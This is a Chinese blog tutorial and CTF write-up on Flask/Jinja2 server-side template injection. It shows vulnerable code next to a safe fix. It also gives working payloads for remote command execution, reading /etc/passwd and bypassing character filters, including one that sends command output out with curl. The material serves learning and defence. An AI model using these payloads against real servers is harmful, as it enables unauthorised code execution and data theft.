---
title: "浅析 Flask SSTI 模板注入"
slug: analysis-of-flask-ssti-template-injection
url: /2020/analysis-of-flask-ssti-template-injection.html
date: 2020-09-16 12:50:05
categories: ["网络安全"]
tags:  ["SSTI", "Flask"]
toc: true
draft: false
---

最近的省赛遇到一个 Flask 模板注入 Bypass 的题目，解题过程中很容易得出有过滤 `_` 和 `.` 两个字符，可惜的是在此之前几乎没有用过 Flask 框架，导致比赛当时极其尴尬，根本不知道如何绕过，最后队友拿出了 Payload，所以赛后自己也较为系统地学习了 Flask 框架。

Flask 框架是一个轻量化的框架，只要不是用于开发，学习成本还是很低的，很容易理解。

## 0x01 渲染模板

在 Flask 中渲染有两个函数：

| 函数                     | 用法                   |
| ------------------------ | ---------------------- |
| `render_template` | 用来渲染一个指定的文件 |
| `render_template_string` | 用来渲染一个字符串     |

Flask 用 Jinja2 作为渲染引擎，这个渲染引擎就是在 html 的基础上，在需要数据交互的地方加上标签标注，最后就是将这些标签解析为标准的开发语言语法。web 层面的漏洞通常就在于数据交互，开发语言写得不够严谨，容易造成一系列的注入问题。Flask 当然也难以避免。

## 0x02 注入浅析

先来看看一段简单的代码：

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/')
def demo():
    html = '''
        <h3>%s</h3>
    ''' % (request.args.get('id'))
    return render_template_string(html)

if __name__ == '__main__':
    app.run(debug=True)
```

为了方便本地修改调试，所以开启了 `debug=True` ，单从这小段代码就可以看出，传入的 `id` 参数直接拼接进了 html 中，毫无疑问直接拼接 html 会存在反射型 xss，而且这里是 Flask 框架，可以执行代码，存在 RCE。

这是一种不严谨的写法，安全的写法如下：

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/')
def demo():
    return render_template_string('<h3>{{ html }}</h3>', html=request.args.get('id'))

if __name__ == '__main__':
    app.run(debug=True)
```

在用户输入的部分外包裹&#123; &#123; }}，这样就只是一个单纯的传参，不会引起代码执行。

接着看第一个有安全隐患的代码，直接访问，没有传入参数，显示 None。

![1FTi6kxIh8wagZj](https://oss.zjun.info/zjun.info/1FTi6kxIh8wagZj.png)

传入 xss 代码，不出所料，直接将其交给了前端执行。

![7QGFWizJrbKpX4s](https://oss.zjun.info/zjun.info/7QGFWizJrbKpX4s.png)

即然是 Jinja2 的渲染引擎，那么其中的代码也是能够被解析执行的，因此在判断是否存在模板注入时可以用类似于简单的加减乘除法来判断。

![Swz24ajcr9efOKl](https://oss.zjun.info/zjun.info/Swz24ajcr9efOKl.png)

本地环境构造了一个 rce payload：

```python
''.__class__.__base__.__subclasses__()[408].__init__.__globals__['os'].popen('whoami').read()
```

![FtGuAVP3laoILYp](https://oss.zjun.info/zjun.info/FtGuAVP3laoILYp.png)

要分析这个 Payload，就得先说说 Python 的魔术方法：

| 魔术方法           | 作用                                   |
| ------------------ | -------------------------------------- |
| `__class__` | 返回调用的参数类型                     |
| `__base__` | 返回基类                               |
| `__mro__` | 允许我们在当前 Python 环境下追溯继承树 |
| `__subclasses__()` | 返回子类                               |

![jQZTWEfXvMJ8IuL](https://oss.zjun.info/zjun.info/jQZTWEfXvMJ8IuL.png)

上面打印了从 str 类到其父类再到其父类的所有子类。

`[]` 、 `{}` 、 `''` 、 `()` 是 Python 中的内置变量。通过内置变量的一些属性或函数去访问当前 Python 环境中的对象继承树，可以从继承树到根对象类。利用 `__subclasses__()` 等函数可以再到每一个 Object，这样便可以利用当前 Python 环境执行任意代码。

当然 Python 中除了 str 类还有 list、dict、tuple，都可以进行构造， `__mro__` 和 `__base__` 都可以返回其基类，但是 `__base__` 更加直接一些。

```python
''.__class__.__mro__[-1]
{}.__class__.__mro__[-1]
().__class__.__mro__[-1]
[].__class__.__mro__[-1]
''.__class__.__base__
{}.__class__.__base__
().__class__.__base__
[].__class__.__base__
```

这里就能读取到所有的子类了，然后选择我们所要利用的类，从 0 开始，这里我用的是 `<class 'subprocess.Popen'>` 这个类

![frc14xjgSCGnHMN](https://oss.zjun.info/zjun.info/frc14xjgSCGnHMN.png)

它的位置也好确定，写一个 Python 遍历打印位置即可找到位置是 408

![VtqU96fpr4JKjaw](https://oss.zjun.info/zjun.info/VtqU96fpr4JKjaw.png)

这里这么多类其实很多都可以利用，选择一个比较熟悉的就行。实在不知道的呢，建议在本地随便打个 Payload，丢进 burp 中爆破位置，比如用命令执行或文件读取的 Payload，设置 0 到 600，其实本机一共就 472 个类，这里设得较大，也不影响。其中可以命令执行的很多，差不多一半左右的都可以。

```python
{{{}.__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
# 命令执行
{{{}.__class__.__base__.__subclasses__()[343]('/etc/passwd').read()}}
# 文件读取
```

![sp1MovDLQ2HOSmJ](https://oss.zjun.info/zjun.info/sp1MovDLQ2HOSmJ.png)

接着调用 OS 模块执行系统命令并读取执行结果给变量，再打印到网页。

下面是某师傅的 Payload：

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("whoami").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

![OqWJieBfrGhgwzL](https://oss.zjun.info/zjun.info/OqWJieBfrGhgwzL.png)

结合我们上面的分析也能很容易看懂这个 Payload，相当于调用 os 执行 whoami。

## 0x03 Bypass

本节部分参考[Flask/Jinja2 模板注入中的一些绕过姿势](https://p0sec.net/index.php/archives/120/)。

回到文章开头提到的在省赛遇到的题目，题中有过滤 `_` 和 `.` 两个字符，只要 URL 中包含这两个字符就会被拦截。

* **`.`被过滤**

`.` 被过滤的情况，可以利用 `[]` 来包裹函数，替代 `.` 的连接效果：

```python
''['__class__']['__base__']['__subclasses__']()[408]['__init__']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']()
```

![xpaVGBU9f4qRLEO](https://oss.zjun.info/zjun.info/xpaVGBU9f4qRLEO.png)

* **`_`被过滤**

利用 Hex 编码 `\x5f` 替代 `_` ：

```python
''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']()[408]['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('whoami')['read']()
```

![UmVknaRhOirL3pK](https://oss.zjun.info/zjun.info/UmVknaRhOirL3pK.png)

* **`[`被过滤**

利用 `__getitem__` 绕过中括号限制：

```python
''.__class__.__mro__.__getitem__(-1)
request.__class__.__mro__.__getitem__(-1)
```

* **双{被过滤**

利用 `{% if xxx %}xx{% endif %}` 绕过：

```python
{% if ''.__class__.__base__.__subclasses__()[408].__init__.__globals__['os'].popen('curl http://127.0.0.1:5000/?i=`whoami`').read()%}zjun{% endif %}
```

如果可以执行命令，利用 curl 将执行结果带出来。

![EdA74lOaYyfKLTH](https://oss.zjun.info/zjun.info/EdA74lOaYyfKLTH.png)

如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来，可见[Flask/Jinja2 模板注入中的一些绕过姿势](https://p0sec.net/index.php/archives/120/)中关于盲注部分脚本。

* **`__`被过滤**

```python
{{ ''[request.args.class][request.args.mro][-1][request.args.subclasses]()[408][request.args.init][request.args.globals]['os'].popen('whoami').read()}}&class=__class__&mro=__mro__&subclasses=__subclasses__&init=__init__&globals=__globals__
```

* **`''`被过滤**

```python
{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(343)(request.args.path).read() }}&path=/etc/passwd
```

## 参考

* <https://0day.work/jinja2-template-injection-filter-bypasses/>

* <https://p0sec.net/index.php/archives/120/>

* <https://xz.aliyun.com/t/3679#toc-11>

* [https://zgao.top/flask 之 ssti 服务端模版注入漏洞分析](https://zgao.top/flask之ssti服务端模版注入漏洞分析)

* [https://www.0x002.com/2020/2020 重庆市教育系统网络安全攻防竞赛决赛%20-%20Web%20Writeup/#flask](https://www.0x002.com/2020/2020重庆市教育系统网络安全攻防竞赛决赛%20-%20Web%20Writeup/#flask)
